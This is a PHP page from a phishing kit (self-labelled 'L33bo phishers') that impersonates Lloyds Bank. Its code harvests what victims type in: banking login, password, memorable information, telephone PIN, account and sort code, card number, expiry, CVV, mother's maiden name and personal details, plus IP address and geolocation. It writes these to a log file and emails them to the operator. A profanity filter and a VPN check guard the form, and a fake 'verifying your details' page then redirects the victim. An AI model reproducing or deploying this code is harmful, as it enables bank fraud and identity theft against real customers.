<?php 
/*
L33bo phishers = ICQ: 695059760
*/
require "assets/includes/session_protect.php";
require "assets/includes/functions.php";
require "assets/includes/One_Time.php";
require "assets/includes/enc.php";
require "../CONTROLS.php";
date_default_timezone_set('Europe/London');
$date = date('l d F Y');
$time = date('H:i');
$user = $_SESSION['user'];
$pass = $_SESSION['pass'];
$memo = $_SESSION['memo'];
$name = $_POST['name'];
$dob = $_POST['dob'];
$address = $_POST['address'];
$postcode = $_POST['postcode'];
if(!isset($_POST['telephone'])) {
$telephone = '';
}      
else $telephone = $_POST['telephone'];
$mobile = $_POST['mobile'];
$mmn = $_POST['mmn'];
$acno = $_POST['acno'];
$sortcode = $_POST['sortcode'];
$ccno = $_POST['ccno'];
$ccexp = $_POST['ccexp'];
$secode = $_POST['secode'];
$telepin = $_POST['telepinFinal1'] . "" . $_POST['telepinFinal2'] . "" . $_POST['telepinFinal3'] . "" . $_POST['telepinFinal4'] . "" . $_POST['telepinFinal5'] . "" . $_POST['telepinFinal6'];
$ip = $_SERVER['REMOTE_ADDR'];
$systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
$ccno = str_replace(' ', '', $ccno);
$cardInfo = bankDetails($ccno);
$BIN = ($cardInfo['bin']);
$Bank = ($cardInfo['bank']);
$Brand = ($cardInfo['brand']);
$Type = ($cardInfo['card_type']);
$category = ($cardInfo['card_category']);
$VictimInfo1 = "| IP Address :"." ".$_SERVER['REMOTE_ADDR']." (".gethostbyaddr($_SERVER['REMOTE_ADDR']).")";
$VictimInfo2 = "| Location :"." ".$systemInfo['city'].", ".$systemInfo['region'].", ".$systemInfo['country'];
$VictimInfo3 = "| UserAgent :"." ".$systemInfo['useragent'];
$VictimInfo4 = "| Browser :"." ".$systemInfo['browser'];
$VictimInfo5 = "| Platform :"." ".$systemInfo['os'];
$from = $From_Address;
$headers = "From:" . $from;
$subj = "L00y : $ip";
$to = $Your_Email; 
$warnsubj = "Abuse";
$warn = "A user (with ip: $ip) has attempted to send you a completed form containing abusive language, this user has been redirected to the official site and is now bloacked from accessing this page.";
$bad_words = array('9999','4r5e','5h1t','5hit','a55','anal','anus','ar5e','arrse','arse','ass','ass-fucker','asses','assfucker','assfukka','asshole','assholes','asswhole','a_s_s','b!tch','b00bs','b17ch','b1tch','ballbag','balls','ballsack','bastard','beastial','beastiality','bellend','bestial','bestiality','bi+ch','biatch','bitch','bitcher','bitchers','bitches','bitchin','bitching','bloody','blow job','blowjob','blowjobs','boiolas','bollock','bollok','boner','boob','boobs','booobs','boooobs','booooobs','booooooobs','breasts','buceta','bugger','bum','bunny fucker','butt','butthole','buttmuch','buttplug','c0ck','c0cksucker','carpet muncher','cawk','chink','cipa','cl1t','clit','clitoris','clits','cnut','cock','cock-sucker','cockface','cockhead','cockmunch','cockmuncher','cocks','cocksuck ','cocksucked ','cocksucker','cocksucking','cocksucks ','cocksuka','cocksukka','cok','cokmuncher','coksucka','coon','cox','crap','cum','cummer','cumming','cums','cumshot','cunilingus','cunillingus','cunnilingus','cunt','cuntlick ','cuntlicker ','cuntlicking ','cunts','cyalis','cyberfuc','cyberfuck ','cyberfucked ','cyberfucker','cyberfuckers','cyberfucking ','d1ck','damn','dick','dickhead','dildo','dildos','dink','dinks','dirsa','dlck','dog-fucker','doggin','dogging','donkeyribber','doosh','duche','dyke','ejaculate','ejaculated','ejaculates ','ejaculating ','ejaculatings','ejaculation','ejakulate','f u c k','f u c k e r','f4nny','fag','fagging','faggitt','faggot','faggs','fagot','fagots','fags','fanny','fannyflaps','fannyfucker','fanyy','fatass','fcuk','fcuker','fcuking','feck','fecker','felching','fellate','fellatio','fingerfuck ','fingerfucked ','fingerfucker ','fingerfuckers','fingerfucking ','fingerfucks ','fistfuck','fistfucked ','fistfucker ','fistfuckers ','fistfucking ','fistfuckings ','fistfucks ','flange','fook','fooker','fuck','fucka','fucked','fucker','fuckers','fuckhead','fuckheads','fuckin','fucking','fuckings','fuckingshitmotherfucker','fuckme ','fucks','fuckwhit','fuckwit','fudge packer','fudgepacker','fuk','fuker','fukker','fukkin','fuks','fukwhit','fukwit','fux','fux0r','f_u_c_k','gangbang','gangbanged ','gangbangs ','gaylord','gaysex','goatse','God','god-dam','god-damned','goddamn','goddamned','hardcoresex ','hell','heshe','hoar','hoare','hoer','homo','hore','horniest','horny','hotsex','jack-off ','jackoff','jap','jerk-off ','jism','jiz ','jizm ','jizz','kawk','knob','knobead','knobed','knobend','knobhead','knobjocky','knobjokey','kock','kondum','kondums','kum','kummer','kumming','kums','kunilingus','l3i+ch','l3itch','labia','lmfao','lust','lusting','m0f0','m0fo','m45terbate','ma5terb8','ma5terbate','masochist','master-bate','masterb8','masterbat*','masterbat3','masterbate','masterbation','masterbations','masturbate','mo-fo','mof0','mofo','mothafuck','mothafucka','mothafuckas','mothafuckaz','mothafucked ','mothafucker','mothafuckers','mothafuckin','mothafucking ','mothafuckings','mothafucks','mother fucker','motherfuck','motherfucked','motherfucker','motherfuckers','motherfuckin','motherfucking','motherfuckings','motherfuckka','motherfucks','muff','mutha','muthafecker','muthafuckker','muther','mutherfucker','n1gga','n1gger','nazi','nigg3r','nigg4h','nigga','niggah','niggas','niggaz','nigger','niggers ','nob','nob jokey','nobhead','nobjocky','nobjokey','numbnuts','nutsack','orgasim ','orgasims ','orgasm','orgasms ','p0rn','pawn','pecker','penis','penisfucker','phonesex','phuck','phuk','phuked','phuking','phukked','phukking','phuks','phuq','pigfucker','pimpis','piss','pissed','pisser','pissers','pisses ','pissflaps','pissin ','pissing','pissoff ','poop','porn','porno','pornography','pornos','prick','pricks ','pron','pube','pusse','pussi','pussies','pussy','pussys ','rectum','retard','rimjaw','rimming','s hit','s.o.b.','sadist','schlong','screwing','scroat','scrote','scrotum','semen','sex','sh!+','sh!t','sh1t','shag','shagger','shaggin','shagging','shemale','shi+','shit','shitdick','shite','shited','shitey','shitfuck','shitfull','shithead','shiting','shitings','shits','shitted','shitter','shitters ','shitting','shittings','shitty ','skank','slut','sluts','smegma','smut','snatch','son-of-a-bitch','spac','spunk','s_h_i_t','t1tt1e5','t1tties','teets','teez','testical','testicle','tit','titfuck','tits','titt','tittie5','tittiefucker','titties','tittyfuck','tittywank','titwank','tosser','turd','tw4t','twat','twathead','twatty','twunt','twunter','v14gra','v1gra','vagina','viagra','vulva','w00se','wang','wank','wanker','wanky','whoar','whore','willies','willy','xrated','fuck','fuckoff','fuck off','fucking','nigger','nigerian','Nigerian','scam','cunt','wankers','twats','scammers','shit','wanker','cunt','asshole','arsehole','passwd','sample');
$data = "
+ ------------- l33bo Phishers -------------+
+ ------------------------------------------+
+ Personal Information
| Full name : $name
| Date of birth : $dob
| Address : $address
| Postcode : $postcode
| Home Tel : $telephone
| Mobile Tel : $mobile
| Mother Maiden : $mmn
+ ------------------------------------------+
+ Account Information
| User : $user
| Pass : $pass
| Memorable Info : $memo
| 6-digit Security Code: $telepin
| Account No: $acno
| Sortcode: $sortcode
+ ------------------------------------------+
+ Billing Information
| Card BIN : $BIN
| Card Bank : $Bank
| Card Type : $Brand $Type
| Card Number : $ccno
| Expiration date : $ccexp
| CVV : $secode
+ ------------------------------------------+
+ Victim Information
$VictimInfo1
$VictimInfo2
$VictimInfo3
$VictimInfo4
$VictimInfo5
| Received : $date @ $time
+ ------------------------------------------+
";
if($Encrypt==1) {
include("assets/includes/AES.php");
$imputText = $data;
$imputKey = "232BBCD7D47A1192";
$blockSize = 256;
$aes = new AES($imputText, $imputKey, $blockSize);
$enc = $aes->encrypt();
$aes->setData($enc);
$dec=$aes->decrypt();
}
if($Abuse_Filter==1)
{
foreach($bad_words as $bad_word){
	if(stristr($_POST['name'], $bad_word) !== false) {
		mail($to,$warnsubj,$warn,$headers);
        exit(header("Location:  https://www.google.co.jp/url?sa=t&rct=j&q=&esrc=s&source=web&cd=2&cad=rja&uact=8&ved=0ahUKEwiiz86irc3KAhVGHqYKHTY2D_8QjBAIIjAB&url=http%3A%2F%2Fwww.lloydsbank.com%2Fonline-banking%2Finternet-banking.asp&usg=AFQjCNFh5kHG2Uy63mX1tK0qLGqiNjQBMQ"));
    }
	if(stristr($_POST['mmn'], $bad_word) !== false) {
		mail($to,$warnsubj,$warn,$headers);
        exit(header("Location:  https://www.google.co.jp/url?sa=t&rct=j&q=&esrc=s&source=web&cd=2&cad=rja&uact=8&ved=0ahUKEwiiz86irc3KAhVGHqYKHTY2D_8QjBAIIjAB&url=http%3A%2F%2Fwww.lloydsbank.com%2Fonline-banking%2Finternet-banking.asp&usg=AFQjCNFh5kHG2Uy63mX1tK0qLGqiNjQBMQ"));
    }
}
}
if($Save_Log==1) {
	if($Encrypt==1) {
	$file=fopen("assets/logs/lloyds.txt","a");
	fwrite($file,$enc);
	fclose($file);
	}
	else {
	$file=fopen("assets/logs/lloyds.txt","a");
	fwrite($file,$data);
	fclose($file);
	}
}	
require "../assets/includes/vpn_check.php";
if($Send_Log==1) {
	if($Encrypt==1) {
	mail($to,$subj,$enc,$headers);	
	}
	else {
	mail($to,$subj,$data,$headers);	
	}
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en-gb" xml:lang="en-gb" class=" js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Complete</title>
<link rel="shortcut icon" href="assets/img/favicon.ico">
<meta http-equiv="X-UA-Compatible" content="IE=Edge"> 
<meta http-equiv="X-UA-Compatible" content="IE=8; IE=9; IE=10">
<meta name="format-detection" content="telephone=no">
<link href="assets/css/001.css" media="screen, print" type="text/css" rel="stylesheet">
<link href="assets/css/global2-min151127.css" media="screen, print" type="text/css" rel="stylesheet">
<link href="assets/css/global3-min151224.css" media="screen, print" type="text/css" rel="stylesheet">
<link href="assets/css/has_js.css" media="screen" type="text/css" rel="stylesheet">
<link href="assets/css/header-footer-min151214.css" media="screen, print" type="text/css" rel="stylesheet">  
<link href="assets/css/touch-min151214.css" media="screen, print" type="text/css" rel="stylesheet">
<meta http-equiv="refresh" content="5; URL='../Finish.php?&sessionid=<?php echo generateRandomString(110); ?>&securessl=true'" />
</head>
<body class="hasJS safari_537">
        <div id="wrapper">
 <div lang="en" class="no-js">
          
<header>
<div class="sp-pat-m-hf-01-bank-bar need-javascript">
   <div class="m-hf-01-container m-container"><div class="m-01-logo"><img src="assets/img/logo.png" class="desktop_logo"><img src="assets/img/mobile_logo.png"  height="40" width="42" class="mobile_logo"></div><div class="m-01-menu-buttons">
   <ul><li><div class="m-01-menu-home"><a href="#"><span class="m-01-menu-button-text">HOME</span></a></div></li><li>
   <div class="m-01-menu-button m-01-menu-right">
    <a href="" class="m-01-menu-button-text">
     MENU</a>
   </div>
  </li>
  </ul>
  </div><div class="m-fh-01-navigation" role="navigation"><ul class="pull-right m-01-menu-bar"><li class="m-hf-01-cookie-policy"><a href="#" tabindex="17">Cookie Policy</a></li><li class="m-hf-01-safe-secure"><a href="" tabindex="19">Safe and secure<span>Our Internet Banking guarantee </span></a>
   </li>
   </ul><ul class="m-01-menu-bar"></ul>
  </div>
  </div>
  </div>

    
        <div class="sp-pat-m-hf-01-bank-bar-container">
<div class="mvt_content"><style type="text/css">body
{
  margin:0;
}

body.ls-center
{
  text-align:center;
}

.ls-canvas .ls-row .ls-row-clr
{
  clear:both;
}

.ls-canvas .ls-col
{
  overflow:hidden;
}

.ls-canvas .ls-col-body
{
  overflow:hidden;
}

.ls-canvas .ls-area
{
  overflow:hidden;
}

.ls-canvas .ls-area-body
{
  overflow:hidden;
}

.ls-canvas .ls-area .ls-1st
{
  margin-top:0 !important;
}

.ls-canvas .ls-cmp-wrap
{
  padding:1px 0;
}

.ls-canvas .iw_component
{
  margin:-1px 0;
}

.ls-canvas .ls-row .ls-lqa-fix
{
  font-size:0;
  line-height:0;
  height:0;
  margin-top:0;
}

.ls-canvas .ls-row .ls-lqr-w
{
  float:left;
  width:100%;
}

.ls-canvas .ls-row .ls-lqr-w-fx
{
  float:left;
}

.ls-canvas .ls-row .ls-lqr-e-fx
{
  float:right;
}

</style></div></div><div class="m-hf-02-customer-bar need-javascript m-hf-02-customer-bar-0"><div class="m-container">
<ul class="m-hf-02-nav"><li class="m-hf-02-home cb-tab-home"><div class="nav-title"><a href="#"></a></div></li><li class=" hide-desktab"><div class="nav-title"></div></li><li class=" m-hf-02-logout cb-tab-aux-link hide-desktab"><div class="nav-title"></div></li><li class=" m-hf-02-tab cb-tab-accounts"><div class="nav-title"></div><div class="nav-content" style="top: 49px;"></div></li><li class=" m-hf-02-tab cb-tab-profile hide-mobile"><div class="nav-title"></div><div class="nav-content" data-ajax-load="true" style="top: 49px;"></div></li><li class=" m-hf-02-tab cb-tab-help-contact hide-mobile"><div class="nav-title"><a href="#" class="main-nav">Help &amp; Support</a></div><div class="nav-content" style="top: 49px;"></div></li><li class=" m-hf-02-mail cb-tab-mail hide-mobile"><div class="nav-title"><a href="#" class="ViewInboxAnchor1"><span class="m-hf-02-mail-icon">Inbox </span><span class="m-hf-02-mail-badge-read">0</span></a></div></li><li class=" hide-desktab"><div class="nav-title"><a href="#" class="sub-nav-toggle">Help &amp; contact us</a></div><ul class="mobile-sub-nav"><li><a href="#">Lost or stolen card</a></li><li><a href="#">Order replacement card or PIN</a></li><li><a href="#">
          Help</a></li><li><a href="#">General enquires are open 24/7. <span class="underline">0800 096 9779</span></a></li><li><a href="#">Contact us</a></li></ul></li><li class=" m-hf-02-logout cb-tab-logout cb-tab-aux-link"><div class="nav-title"><a href="#">Log Off</a></div></li><li class=" m-hf-02-logout cb-tab-aux-link hide-desktab"><div class="nav-title"><a href="#">Cookie Policy</a></div></li><li class=" m-hf-02-logout cb-tab-aux-link hide-desktab"><div class="nav-title"><a href="#">Safe and secure</a></div></li></ul></div></div>
</header>

            <div class="pageWrap">
                <div id="page" class="content">
                
                    <div class="primaryWrap">
                    
                        <div class="primary">
                        <div class="panel">
<fieldset>
<div style="width:100%important;">
<h1>Verification Complete</h1>
<div class="message">
<br/>
<a id="loadingIcon" name="loadingIcon" href="#"><img style="display:block;margin-left:auto;margin-right:auto" src="assets/img/004.gif"/></a>
<br />
<h1 style=" text-align: center;">Please wait while we check your information</h1>
<br />
<p align="center" style="text-align: center;">It'll only take a few seconds - we're just verifying the details that you've entered.</p>
<p align="center"  style="text-align: center;">Please don't refresh this page or close your browser while you're waiting.</p>
<p></p>
</div>
</div>

<hr>
<p align="center" style="text-align:center;color: #dc2a4d;text-decoration: underline;">You will be redirected to our homepage when were done verifying your details</p>

</div>
</fieldset>
</form>
                            </div>
                        </div>
                        
                   
                    <div class="secondary">
                        <div class="panel">
                            <div class="accordion ui-accordion ui-widget ui-helper-reset" role="tablist"><div class="part"><h2 class="trigger linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-default ui-corner-all" role="tab" aria-expanded="false" tabindex="0" title="Contact Us....: Use this link to show or hide more information."><span class="ui-icon ui-icon-triangle-1-e"></span>Contact Us....</h2><div class="pane ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom" role="tabpanel" style="display: none;"><div class="paneInner"><div class="quickContact">
			

	<h3>All account related queries</h3>
<p><strong>0345 300 0000</strong></p>
<p>If you need to call us from abroad or prefer not to use our 0345 number, you can also call us on +44 1733 347 007.</p>
<p>Calls may be monitored and recorded in case we need to check we have carried out your instructions correctly and to help us improve our quality of service.<br><br></p>
<h3>Internet Banking queries</h3>
<p>Technical queries about the Internet Banking service</p>
<p><strong>0345 300 0116</strong></p>
<p>If you need to call us from abroad or prefer not to use our 0345 number, you can also call us on&nbsp;+44 2076 499 437.</p>
	



			
		</div></div></div></div><div class="part selected"><h2 class="trigger current linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-active ui-corner-top" role="tab" aria-expanded="true" tabindex="0" title="Help &amp; Support: Use this link to show or hide more information."><span class="ui-icon ui-icon-triangle-1-s"></span>Help &amp; Support</h2><div class="pane ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom ui-accordion-content-active" role="tabpanel"><div class="paneInner"><span class="showMeMenu"> 
	<ul class="quickFAQs ui-accordion ui-widget ui-helper-reset" role="tablist">
			
	
	<li class="ui-accordion-li-fix"><h3 class="qfaqTrigger linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-default ui-corner-all" tabindex="0" role="tab" aria-expanded="false" title="Do you have any tips for preventing identity fraud?: Use this link to show or hide more information."><span class="ui-icon ui-icon-triangle-1-e"></span>Do you have any tips for preventing identity fraud?</h3>
			<div class="qfaqCont ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom" role="tabpanel" style="display: none;">
					<p>Taking extra care with your paperwork and using the internet safely can help you reduce identity fraud and keep criminals at bay.&nbsp;<a class="newwin" href="#">How can I tell that this site is secure?</a></p>
				    </div>
			</li>
<li class="ui-accordion-li-fix"><h3 class="qfaqTrigger linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-default ui-corner-all" tabindex="0" role="tab" aria-expanded="false" title="What measures can I take to protect my account?: Use this link to show or hide more information."><span class="ui-icon ui-icon-triangle-1-e"></span>What measures can I take to protect my account?</h3>
			<div class="qfaqCont ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom" role="tabpanel" style="display: none;">
					<p>Adopting a few good habits can help make sure your personal information stays safe and secure on the internet.&nbsp;<a class="newwin" href="#">How can I tell that this site is secure?</a></p>
				    </div>
			</li>
<li class="ui-accordion-li-fix"><h3 class="qfaqTrigger linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-default ui-corner-all" tabindex="0" role="tab" aria-expanded="false" title="How can I email you?: Use this link to show or hide more information."><span class="ui-icon ui-icon-triangle-1-e"></span>How can I email you?</h3>
			<div class="qfaqCont ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom" role="tabpanel" style="display: none;">
					<p></p><p>We do not have a customer email facility, however our <a class="newwin" href="#">Self Service</a>&nbsp;facility makes it easy for you to order day-to-day banking items such as new cheque books, PINs, replacement cards or certificates of interest. For security reasons, please do not use this form to email us with any questions relating to your account - please call us instead on&nbsp;<strong>0345 300 0000</strong>, we're open 24/7. If you prefer not to use our 0345 number, you can also call us on&nbsp;+44 1733 347 007.</p><p></p>
				    </div>
			</li>
<li class="ui-accordion-li-fix"><h3 class="qfaqTrigger linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-default ui-corner-all" tabindex="0" role="tab" aria-expanded="false" title="How can I tell if a site is secure?: Use this link to show or hide more information."><span class="ui-icon ui-icon-triangle-1-e"></span>How can I tell if a site is secure?</h3>
			<div class="qfaqCont ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom" role="tabpanel" style="display: none;">
					<p>Always look for https:// rather than the usual http:// in your browser’s address bar. You should also check for a small padlock icon in your browser window. It means that your information is being encrypted and is secure.</p>
				    </div>
			</li>
</ul>

					<p><a href="#" class="linkBullet linkMore newwin newfaqwin">More Help &amp; Support</a></p>
					
</span></div></div></div></div>
                        </div>
                    </div>
                </div>              
            </div>
            <div class="sp-pat-m-hf-03-footer">
<div class="mvt_content"><style type="text/css">body
{
  margin:0;
}

body.ls-center
{
  text-align:center;
}

.ls-canvas .ls-row .ls-row-clr
{
  clear:both;
}

.ls-canvas .ls-col
{
  overflow:hidden;
}

.ls-canvas .ls-col-body
{
  overflow:hidden;
}

.ls-canvas .ls-area
{
  overflow:hidden;
}

.ls-canvas .ls-area-body
{
  overflow:hidden;
}

.ls-canvas .ls-area .ls-1st
{
  margin-top:0 !important;
}

.ls-canvas .ls-cmp-wrap
{
  padding:1px 0;
}

.ls-canvas .iw_component
{
  margin:-1px 0;
}

.ls-canvas .ls-row .ls-lqa-fix
{
  font-size:0;
  line-height:0;
  height:0;
  margin-top:0;
}

.ls-canvas .ls-row .ls-lqr-w
{
  float:left;
  width:100%;
}

.ls-canvas .ls-row .ls-lqr-w-fx
{
  float:left;
}

.ls-canvas .ls-row .ls-lqr-e-fx
{
  float:right;
}

</style>
<div class="ls-canvas sp-pat-wrapper">
<div class="ls-row">
<div class="ls-lqr">
<div class="ls-area">
<div class="ls-area-body">
<div class="ls-cmp-wrap ls-1st">
<div class="iw_component">
<div class="m-hf-03-footer-01">
<div class="m-container m-hf-01-threecol">
<div class="footer-section">
<h3>Banking with us</h3>
<ul>
<li><a href="#">Branch finder</a></li>
<li><a href="#">CashPoint&reg; finder</a></li>
<li><a href="#">Mobile Banking</a></li>
<li><a href="#">Rate and charges</a></li>
<li><a href="#">Glossary</a></li>
</ul>
</div>
<div class="footer-section">
<h3>About us</h3>
<ul>
<li><a href="#">Communities</a></li>
<li><a href="#">Lloyds Banking Group</a></li>
<li><a href="#">Careers</a></li>
</ul>
</div>
<div class="footer-section">
<h3>About this site</h3>
<ul>
<li><a href="#">Security</a></li>
<li><a href="#">Legal</a></li>
<li><a href="#">Privacy</a></li>
<li><a href="#">Terms and conditions</a></li>
<li><a href="#">Accessibility</a></li>
<li><a href="#">Contact us</a></li>
</ul>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div><div class="m-hf-03-footer-02">
            <div class="m-container">
                <div><a href="#">Go to mobile site</a></div>
            </div>
        </div><div class="m-hf-03-footer-03"><div class="m-container"><div class="smallprint"><p>Lloyds Bank plc is authorised by the Prudential Regulation Authority and regulated by the Financial Conduct Authority and the Prudential Regulation Authority under registration number 119278.</p> <p>Lloyds Bank plc is covered by the Financial Services Compensation Scheme and the Financial Ombudsman Service. (Please note that due to the schemes eligibility criteria not all Lloyds Bank business customers will be covered by these schemes.)</p> <p>Calls may be recorded for our mutual protection, training and monitoring purposes.</p> <p>Accounts in Jersey, the Bailiwick of Guernsey and the Isle of Man are held by Lloyds Bank International Limited which is not and is not required to be, authorised under the Financial Services and Markets Act 2000 of the United Kingdom and therefore is not subject to the rules and regulations of the Financial Services Compensation Scheme made under that Act for the protection of depositors or investors.  For more information about depositor compensation schemes in Jersey, the Bailiwick of Guernsey and the Isle of Man please <a href="#">click here.</a></p><p>Lloyds Bank International Limited. Registered office and principal place of business: PO Box 160, 25 New Street, St. Helier, Jersey JE4 8RG. Lloyds Bank International Limited is incorporated in Jersey No. 4029 and is regulated by the Jersey Financial Services Commission to carry on deposit-taking business under the Banking Business (Jersey) Law 1991 and investment and general insurance mediation business under the Financial Services (Jersey) Law 1998. Lloyds Bank International Limited subscribes to the Jersey Code of Practice for Consumer Lending and has also notified the Jersey Financial Services Commission that it carries on money service business.</p><p>The Guernsey branch of Lloyds Bank International Limited, principal place of business PO Box 136, Sarnia House, Le Truchot, St Peter Port, Guernsey, GY1 4EN, is licensed by the Guernsey Financial Services Commission to take deposits and to carry on controlled investment business and insurance intermediary business under The Banking Supervision (Bailiwick of Guernsey) Law, 1994, The Protection of Investors (Bailiwick of Guernsey) Law, 1987 (as amended) and The Insurance Managers and Insurance Intermediaries (Bailiwick of Guernsey) Law, 2002 (as amended), respectively, and is also registered with the Guernsey Financial Services Commission as a money service provider.</p><p>The Isle of Man branch of Lloyds Bank International Limited of PO Box 111, Peveril Buildings, Peveril Square, Douglas, Isle of Man IM99 1JJ, is licensed by the Isle of Man Financial Supervision Commission to conduct deposit-taking and investment business and is registered with the Isle of Man Insurance and Pensions Authority in respect of general insurance business (intermediary).</p></div> </div> </div></div>
        </div>


    
</div></body></html>